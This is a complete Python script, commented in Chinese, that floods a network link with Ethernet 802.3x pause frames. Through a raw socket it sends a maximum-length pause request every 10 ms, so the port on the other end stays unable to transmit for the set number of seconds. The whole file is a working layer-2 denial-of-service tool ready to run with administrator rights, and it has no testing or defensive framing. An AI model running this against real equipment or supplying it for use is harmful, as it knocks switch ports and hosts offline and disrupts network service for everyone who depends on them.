#!/usr/bin/env python3
"""从主机的一块网卡连着发以太网的暂停帧（802.3x），把对面那个口的发送压住。要管理员权限。

用法：发暂停帧.py 网卡名 秒数

每 10 毫秒发一帧，每一帧要对面停最长的时间（65535 个单位，千兆时大约 33 毫秒），所以对面一直发不出去。
帧里的源地址用这块网卡自己的，从内核取，不显示。做完打印一共发了几帧。
"""
import socket
import sys
import time


def main():
    interface, seconds = sys.argv[1], float(sys.argv[2])
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    sock.bind((interface, 0))
    source = sock.getsockname()[4]
    # 目的地址是标准规定的那一个（暂停帧专用），类型 0x8808，操作码 1，停 0xffff 个单位，后面补零到最短帧长。
    frame = bytes([0x01, 0x80, 0xC2, 0x00, 0x00, 0x01]) + source + bytes([0x88, 0x08, 0x00, 0x01, 0xFF, 0xFF]) + bytes(42)
    end = time.monotonic() + seconds
    count = 0
    while time.monotonic() < end:
        sock.send(frame)
        count += 1
        time.sleep(0.01)
    print(count)


if __name__ == "__main__":
    main()
